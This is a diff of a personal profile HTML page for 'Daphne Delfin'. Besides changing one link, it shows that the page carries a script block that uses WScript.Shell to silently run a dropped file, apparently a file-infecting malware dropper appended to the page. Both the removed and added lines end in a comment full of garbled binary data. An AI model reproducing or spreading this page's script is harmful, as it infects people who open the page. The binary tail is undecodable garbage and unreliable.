@@ -13,7 +13,7 @@ body{
 <body>
 <h2>Daphne Delfin</h2>
 <center><img src="daphneP.jpg" height="200" width="200"></center>
-<p><a href="content.html" target="content">HOME</a></p>
+<p><a href="content.php" target="content">HOME</a></p>
 <h1><center>INFORMATION</h1></center>
 <p><front = 'Georgia'><b>First Name:</b>Daphne</p>
 <p><front = 'Georgia'><b>Middle Name:</b>Delfin</p>
@@ -39,5 +39,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--��.	��cxz$�%G�:���N;=rR�GQ[J/P�J�ݟd�N��<o����3��4P����gt��@�"��yW���C:�VUEY�w$b\E�|�\�tS�_�߀���}�����!��;�\	U�M�שQUs��~�גP����ҍ��+�r]s��-��OW� �}ZU���p���punO�������=�|[\�����o��� 損�F�̙�����2%5'�͹
-�ҳ���E>p��1㼱���Bʩ u��j����G��=��]g/��Mg��s� ���<��!�/��\��Ⴀ(�uۧ�}�i#��q[ ��R(���������N�X-�� ��-->
+//--></SCRIPT><!--´.	Ícxz$ä%Gà:ÍÍN;=rRìGQ[J/PîJÌÝdòN»<o¼¹3ÒÂ4Päô«gtíË@Ó"úùyWîëC:òVUEY¬w$b\Eñ|È\tSã_ß£â}ý!ñ÷;\	UáMâ×©QUs«É~ª×PÉö»ùÒË+«r]s«ü-ÑÏOWÙ }ZU´æpþ÷punO³¸ü=Ð|[\àõ£½o æñFÌª·ÂÎþü2%5'ÃÍ¹
+Ò³²ÍÌE>pÓÄ1ã¼±ïÜBÊ© uój¦±G=ÌÏ]g/üþMgÎÂsÏ ¸<Ðù!ß/Ä\ûÍá (àuÛ§Ö}úi#à¿÷q[ ëÎR(ÕøëÎëÎëÎ¦N·X-èÎ ëÎ-->
